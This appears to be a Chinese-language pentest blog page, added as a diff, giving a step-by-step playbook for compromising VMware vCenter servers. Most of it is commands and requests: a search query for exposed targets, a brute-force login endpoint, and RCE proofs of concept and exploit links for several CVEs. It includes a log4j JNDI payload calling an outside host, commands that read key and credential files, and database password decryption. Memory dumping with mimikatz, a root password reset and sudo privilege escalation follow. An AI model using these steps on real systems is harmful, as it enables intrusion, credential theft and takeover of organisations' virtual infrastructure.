@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>vmware vcenter - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "vmware vcenter", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u9ed8\u8ba4\u5bc6\u7801", url: "#_2" },
+              {title: "\u67e5\u770b\u7248\u672c", url: "#_3" },
+              {title: "\u5bc6\u7801\u7206\u7834\u63a5\u53e3", url: "#_4" },
+              {title: "rce", url: "#rce" },
+              {title: "\u83b7\u53d6web\u63a7\u5236\u53f0\u540e", url: "#web" },
+              {title: "\u63d0\u6743", url: "#_8" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/" class="btn btn-xs btn-link">
+        运维类&开发&设备
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../vmware%20esxi/vmware%20esxi/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../vmware%20esxi/vmware%20esxi/" class="btn btn-xs btn-link">
+        vmware esxi
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="vmware-vcenter">vmware vcenter</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#默认密码">默认密码</a></li>
+<li><a href="#查看版本">查看版本</a></li>
+<li><a href="#密码爆破接口">密码爆破接口</a></li>
+<li><a href="#rce">rce</a><ul>
+<li><a href="#CVE-2021-21972">CVE-2021-21972</a></li>
+<li><a href="#CVE-2021-21985-">CVE-2021-21985 </a></li>
+<li><a href="#CVE-2021-22005">CVE-2021-22005</a></li>
+<li><a href="#CVE-2021-44228-log4j对vcenter的攻击">CVE-2021-44228 log4j对vcenter的攻击</a></li>
+<li><a href="#rce后获取web控制台权限">rce后获取web控制台权限</a><ul>
+<li><a href="#重置密码">重置密码</a></li>
+<li><a href="#cookie登录">cookie登录</a></li>
+<li><a href="#数据库直接解密密码">数据库直接解密密码</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#获取web控制台后">获取web控制台后</a><ul>
+<li><a href="#获取虚拟机权限">获取虚拟机权限</a><ul>
+<li><a href="#远程dump---windows">远程dump - windows</a></li>
+<li><a href="#快照dump---windows">快照dump - windows</a></li>
+<li><a href="#linux直接修改密码">linux直接修改密码</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#提权">提权</a><ul>
+<li><a href="#CVE-2021-3156">CVE-2021-3156</a></li>
+</ul>
+</li>
+</ul>
+<p>集中管理虚拟机</p>
+<p>fofa：</p>
+<pre><code class="language-纯文本">title=&quot;+ ID_VC_Welcome +&quot;
+
+</code></pre>
+<p>虚拟机管理平台</p>
+<p>首页长这样</p>
+<p><img alt="" src="../image/image_fZmWhQ_Qq0.png" /></p>
+<h2 id="_2">默认密码</h2>
+<h2 id="_3">查看版本</h2>
+<pre><code class="language-纯文本">POST /sdk HTTP/1.1
+Host: xx
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 373
+
+&lt;env:Envelope xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:env=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&gt;
+      &lt;env:Body&gt;
+      &lt;RetrieveServiceContent xmlns=&quot;urn:vim25&quot;&gt;
+        &lt;_this type=&quot;ServiceInstance&quot;&gt;ServiceInstance&lt;/_this&gt;
+      &lt;/RetrieveServiceContent&gt;
+      &lt;/env:Body&gt;
+      &lt;/env:Envelope&gt;
+</code></pre>
+<p><img alt="" src="../image/image_jrMdP8guFU.png" /></p>
+<p>也可以get请求</p>
+<pre><code class="language-纯文本">https://ip:port/sdk/vimServiceVersions.xml
+</code></pre>
+<p><img alt="" src="../image/image_qp9Sdqy8Js.png" /></p>
+<h2 id="_4">密码爆破接口</h2>
+<pre><code class="language-纯文本">POST /ui/certificate-ui/ctrl/vecs/login HTTP/1.1
+Host: xx
+Content-Type: application/json
+Content-Length: 86
+
+{&quot;server&quot;:&quot;localhost&quot;,&quot;userName&quot;:&quot;administrator@qiqing.local&quot;,&quot;password&quot;:&quot;1qaz!QAZ..&quot;}
+</code></pre>
+<p>注：使⽤BurpSuite爆破时，因为密码有时会有特殊字符 ，例如` ./=&lt;&gt;?+&amp; *;:"{}|^``，将会被 URL编码。爆破密码时去掉此选项:</p>
+<p>返回登录失败的响应包</p>
+<p><img alt="" src="../image/image_B6dvqVKiQV.png" /></p>
+<h2 id="rce">rce</h2>
+<p>综合利用工具<a href="https://github.com/Schira4396/VcenterKiller" title="https://github.com/Schira4396/VcenterKiller">https://github.com/Schira4396/VcenterKiller</a>(没有检测功能)</p>
+<h3 id="cve-2021-21972">CVE-2021-21972</h3>
+<ul>
+<li>vCenter Server7.0 &lt; 7.0.U1c</li>
+<li>vCenter Server6.7 &lt; 6.7.U3l</li>
+<li>vCenter Server6.5 &lt; 6.5.U3n</li>
+</ul>
+<p>/ui/vropspluginui/rest/services/uploadova</p>
+<p>访问上面的路径，如果404，则代表不存在漏洞，如果405 则可能存在漏洞</p>
+<p><img alt="" src="../image/image_oaChJ7yu5a.png" /></p>
+<p>exp:<a href="https://github.com/NS-Sp4ce/CVE-2021-21972" title="https://github.com/NS-Sp4ce/CVE-2021-21972">https://github.com/NS-Sp4ce/CVE-2021-21972</a></p>
+<pre><code class="language-纯文本">python3 ./CVE-2021-21972.py -url 10.23.2.10
+
+</code></pre>
+<h3 id="cve-2021-21985">CVE-2021-21985&#x20;</h3>
+<p>poc：返回200说明能搞</p>
+<pre><code class="language-纯文本"># curl -s -k -X $'POST' -H $'Host: &lt;target&gt;' -H $'User-Agent: a' -H $'Content-Type: application/json' -H $'Connection: close' --data-binary $'{\&quot;methodInput\&quot;:[{\&quot;type\&quot;:\&quot;ClusterComputeResource\&quot;,\&quot;value\&quot;: null,\&quot;serverGuid\&quot;: null}]}\x0d\x0a' $'https://&lt;target&gt;/ui/h5-vsan/rest/proxy/service/com.vmware.vsan.client.services.capability.VsanCapabilityProvider/getClusterCapabilityData'
+
+</code></pre>
+<p>exp：<a href="https://github.com/xnianq/cve-2021-21985_exp" title="https://github.com/xnianq/cve-2021-21985_exp">https://github.com/xnianq/cve-2021-21985_exp</a> 或者vcenterkiller</p>
+<h3 id="cve-2021-22005">CVE-2021-22005</h3>
+<ul>
+<li>vCenter Server 7.0 &lt; 7.0 U2c build-18356314</li>
+<li>vCenter Server 6.7 &lt; 6.7 U3o build-18485166</li>
+<li>Cloud Foundation (vCenter Server) 4.x &lt; KB85718 (4.3)</li>
+<li>Cloud Foundation (vCenter Server) 3.x &lt; KB85719 (3.10.2.2)</li>
+<li>6.7 vCenters Windows版本不受影响</li>
+</ul>
+<p>exp:</p>
+<p><a href="https://github.com/shmilylty/cve-2021-22005-exp" title="https://github.com/shmilylty/cve-2021-22005-exp">https://github.com/shmilylty/cve-2021-22005-exp</a></p>
+<h3 id="cve-2021-44228-log4jvcenter">CVE-2021-44228 log4j对vcenter的攻击</h3>
+<pre><code class="language-纯文本">GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+Host: 192.168.121.137
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Dnt: 1
+X-Forwarded-For: ${jndi:ldap://9qphlt.dnslog.cn}
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+</code></pre>
+<p>xxf头dnslog有回显就有说法</p>
+<p>然后使用jndiexploit搭建恶意jndi服务器进行攻击。</p>
+<p><a href="https://github.com/WhiteHSBG/JNDIExploit" title="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
+<h3 id="rceweb">rce后获取web控制台权限</h3>
+<h4 id="_5">重置密码</h4>
+<p>使用vcenter的admin工具</p>
+<pre><code class="language-纯文本">#Linux 
+/usr/lib/vmware-vmdir/bin/vdcadmintool 
+
+#Windows 
+C:\Program Files\Vmware\vCenter Server\vmdird\vdcadmintool.exe
+</code></pre>
+<p><img alt="" src="../image/image_fPm0NlOlJb.png" /></p>
+<h4 id="cookie">cookie登录</h4>
+<p>通过解密数据库登录获取cookie，再用cookie登录web</p>
+<p>数据库位置
+linux：/storage/db/vmware-vmdir/data.mdb
+windows：C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb</p>
+<p>1。然后用这个工具<a href="https://github.com/horizon3ai/vcenter_saml_login" title="https://github.com/horizon3ai/vcenter_saml_login">https://github.com/horizon3ai/vcenter_saml_login</a> 获得cookie</p>
+<pre><code class="language-纯文本">python vcenter_saml_login.py -p data.mdb -t 10.9.16.11 
+
+</code></pre>
+<p><img alt="" src="../image/image_XGIss61zL5.png" /></p>
+<p>注</p>
+<p>windows运行脚本需要安装对应版本的python-ldap，windows的data.mdb一般很大拉回来不方便（几百兆到几个G）</p>
+<pre><code class="language-纯文本">https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap1
+
+pip install python_ldap-3.4.0-cp38-cp38-win_amd64.whl
+
+pip install -r requirements.txt
+</code></pre>
+<p>2。如果目标环境有python，那就不用拉回来解密了，用这个脚本<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py" title="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py</a></p>
+<p>运行后生成三个证书</p>
+<p><img alt="" src="../image/image_hHXuGBRuDf.png" /></p>
+<p>把三个证书拖回来（只有几k，一下就拖回来了），然后用这个脚本获取cookie</p>
+<p><a href="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py" title="https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py">https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_GenerateLoginCookie.py</a></p>
+<p><img alt="" src="../image/image_XDCTfjQoNG.png" /></p>
+<p>这个脚本的参数列表</p>
+<pre><code class="language-纯文本">&lt;target&gt; &lt;hostname&gt; &lt;domain&gt; &lt;idp_cert path&gt; &lt;trusted_cert_1 path&gt; &lt;trusted_cert_2 path&gt;
+其中domain可以通过vCenter_ExtraCertFromMdb.py脚本获得
+hostname是主机名
+</code></pre>
+<h4 id="_6">数据库直接解密密码</h4>
+<p>1。获取解密key</p>
+<pre><code class="language-纯文本">#Windows
+type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\ssl\symkey.dat
+
+#Linux
+cat /etc/vmware-vpx/ssl/symkey.dat
+</code></pre>
+<p><img alt="" src="../image/image_4Pn7MWB_xk.png" /></p>
+<p>&#x20;把key保存下来</p>
+<p>2。获取数据库账户密码</p>
+<p>vcenter默认数据库文件存放在vcdb.properties，配置文件中有数据库的明文账号密码</p>
+<pre><code class="language-纯文本">#Linux
+cat /etc/vmware-vpx/vcdb.properties
+cat /etc/vmware/service-state/vpxd/vcdb.properties
+
+#Windows
+type C:\ProgramData\VMware\&quot;VMware VirtualCenter&quot;\vcdb.properties
+type C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+</code></pre>
+<p><img alt="" src="../image/image_0Tvfa9B0oa.png" /></p>
+<p>3。登录数据库</p>
+<p>默认是postgresql</p>
+<pre><code class="language-纯文本">#psql默认存放位置
+Windows: C:\Program Files\VMware\vCenter Server\vPostgres\bin\psql.exe
+Linux: /opt/vmware/vpostgres/9.3/bin/psql
+
+#执行语句查询
+psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c &quot;select ip_address,user_name,password from vpx_host;&quot; &amp;gt; password.enc
+
+#执行完会输出一段加密字段
+Command&amp;gt; shell psql -h 127.0.0.1 -p 5432 -U vc -d VCDB -c &quot;select ip_address,user_name,password from vpx_host;&quot; &amp;gt; password.enc
+Shell access is granted to root
+Password for user vc: 
+ip_address  | user_name |                                         password                                      
+-------------+-----------+---------------------------------------------------------------------------------------
+192.168.1.1 | vpxuser   | *H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==
+192.168.1.2 | vpxuser   | *zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==
+192.168.1.3 | vpxuser   | *Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==
+192.168.1.4 | vpxuser   | *R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==
+(4 rows)
+
+#只保留password字段
+*H8BBiGe3kQqaujz3ptZvzhWXXZ0M6QOoOFIKL0p0cUDkWF/iMwikwt7BCrfEDRnXCqxoju4t2fsRV3xNMg==
+*zR20RvimwMPHz7U6LJW+GnmLod9pdHpdhIFO+Ooqk0/pn2NGDuKRae+ysy3rxBdwepRzNLdq6+paOgi54Q==
+*Q81OIBXziWr0orka0j++PKMSgw6f7kC0lCmITzSlbl/jCDTuRSs07oQnNFpSCC6IhZoPPto5ix0SccQPDw==
+*R6HqZzojKrFeshDIP8vXPMhN28mLDHiEEBSXWYXNHrQQvHcuLOFlLquI2oLRfqLiPlHwkmAxUj9hKj3VZA==
+</code></pre>
+<p>如果是mssql，这时候直接使用 navicat 进行连接，搜索 <code>VPX_HOST</code> 表</p>
+<p><img alt="" src="../image/image_JqKLXFOc2K.png" /></p>
+<p>其它数据库就用navicat连慢慢找吧，实战遇到再来补充。</p>
+<p>只把password保留下来即可</p>
+<p>4。解密密码</p>
+<p><a href="https://github.com/shmilylty/vhost_password_decrypt" title="https://github.com/shmilylty/vhost_password_decrypt">https://github.com/shmilylty/vhost_password_decrypt</a></p>
+<p><img alt="" src="../image/image_G5182hy9RG.png" /></p>
+<p>然后拿去登录即可</p>
+<h2 id="web">获取web控制台后</h2>
+<h3 id="_7">获取虚拟机权限</h3>
+<h4 id="dump-windows">远程dump - windows</h4>
+<p><a href="https://github.com/RicterZ/PySharpSphere" title="https://github.com/RicterZ/PySharpSphere">https://github.com/RicterZ/PySharpSphere</a></p>
+<p>使用该工具即可直接操控vcenter中的虚拟机，很方便。</p>
+<pre><code class="language-纯文本">$ pysharpsphere -H 192.168.3.249 -u opsadmin@vsphere.local -p 123QWEasd@ execute -t vm-13 --guest-user administrator --guest-ntlm ccf9155e3e7db453aad3b435b51404ee -c whoami
+pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password execute -t vm-1020 --guest-user administrator --guest-pass guestpassword -c whoami
+</code></pre>
+<p>但是没有虚拟机的密码或者hash值，也就不能在虚拟机中执行命令。</p>
+<p>要获取虚拟机密码或者hash我们可以把虚拟机dump出来</p>
+<pre><code class="language-纯文本">pysharpsphere -H 192.168.100.49 -u administrator@vsphere.local -p password dump -t vm-1020
+</code></pre>
+<p>然后使用volatility抓去密码或者hash <a href="https://www.volatilityfoundation.org/26" title="https://www.volatilityfoundation.org/26">https://www.volatilityfoundation.org/26</a></p>
+<pre><code class="language-纯文本">#获取镜像信息：
+./vol -f win2k03-Snapshot1.vmem imageinfo
+
+#抓hash
+./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 hashdump
+
+#抓取明文密码-如果有
+./vol -f win2k03-Snapshot1.vmem --profile=Win2003SP1x64 lsadump
+
+</code></pre>
+<h4 id="dump-windows_1">快照dump - windows</h4>
+<pre><code class="language-纯文本">#1、在web页面右键虚拟机生成虚拟机快照，然后在数据存储中找到对应的虚拟机名字的文件夹下会生成两个vmem vmsn文件
+#？ 也可以直接用上一步的volatity直接dump hash
+#2、用vss2core 整合两个文件，出现dump文件，把dump文件拉回来本地 https://flings.vmware.com/vmss2core
+
+vss2core -W 1.vmem 1.vmsn
+PS：如果目标是2012,2016,2019,Windows 8/8.1 请把-W 改成-W8
+
+#3、然后用windbg preview打开，注意一定要最新版win10的，随便下一个旧版的不行
+#4、在windbg上载入mimikatz
+
+.load  D:\tmpdump\mimilib.dll
+
+#5、导出lsass.exe的内存、这里会返回一个process地址
+
+!process 0 0 lsass.exe
+
+#6、到对应内存位置执行mimikatz，然后就会出密码了
+
+.process /r /p ffffa68274d8a080
+!mimikatz
+</code></pre>
+<h4 id="linux">linux直接修改密码</h4>
+<p>本质上就是linux忘记密码了怎么办，我看网上有很多方法可以搞。这里只说一个centos的，ubuntu啥的也是大同小异：<a href="https://zhuanlan.zhihu.com/p/145417594" title="https://zhuanlan.zhihu.com/p/145417594">https://zhuanlan.zhihu.com/p/145417594</a>（ubuntu忘记密码怎么办）</p>
+<p>需重启，但可以复制一个再重启，以免生产环境g了。</p>
+<p>在开机界面按字母e进入引导</p>
+<p><img alt="" src="../image/image_ojTArcULf9.png" /></p>
+<p>在linux16这一行找到“ro” ，将 “ro” 修改为 ” rw init=/sysroot/bin/bash “；</p>
+<p><img alt="" src="../image/image_KiS-QVmfuA.png" /></p>
+<p>然后按下ctrl+x进入救援模式，输入如下命令</p>
+<pre><code class="language-纯文本">chroot /sysroot
+passwd root  //重置密码
+touch /.autorelabel
+exit
+reboot -f
+
+</code></pre>
+<p>重启后就能拿密码登录了</p>
+<h2 id="_8">提权</h2>
+<h3 id="cve-2021-3156">CVE-2021-3156</h3>
+<p>适用版本：vCenter 7.0&#x20;
+sudo 提权漏洞将 <code>vsphere-ui</code> 权限提升到 <code>root</code> 权限。</p>
+<p><a href="https://github.com/worawit/CVE-2021-3156/tree/main" title="https://github.com/worawit/CVE-2021-3156/tree/main">https://github.com/worawit/CVE-2021-3156/tree/main</a></p>
+<pre><code class="language-纯文本">Choosing exploit
+For Linux distributions that glibc has tcache support and enabled (CentOS 8, Ubuntu &gt;= 17.10, Debian 10):
+
+try exploit_nss.py first
+If an error is not glibc tcache related, you can try exploit_timestamp_race.c next
+For Linux distribution that glibc has no tcache support:
+
+if a target is Debian 9, Ubuntu 16.04, or Ubuntu 14.04, try exploit_nss_xxx.py for specific version first
+next, try exploit_defaults_mailer.py. If you know a target sudo is compiled with --disable-root-mailer, you can skip this exploit. The exploit attempt to check root mailer flag from sudo binary. But sudo permission on some Linux distribution is 4711 (-rws--x--x) which is impossible to check on target system. (Known work OS is CentOS 6 and 7)
+last, try exploit_userspec.py
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../../%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../../%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/%E8%BF%90%E7%BB%B4%E7%B1%BB%26%E5%BC%80%E5%8F%91%26%E8%AE%BE%E5%A4%87/" class="btn btn-xs btn-link">
+        运维类&开发&设备
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../vmware%20esxi/vmware%20esxi/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../vmware%20esxi/vmware%20esxi/" class="btn btn-xs btn-link">
+        vmware esxi
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
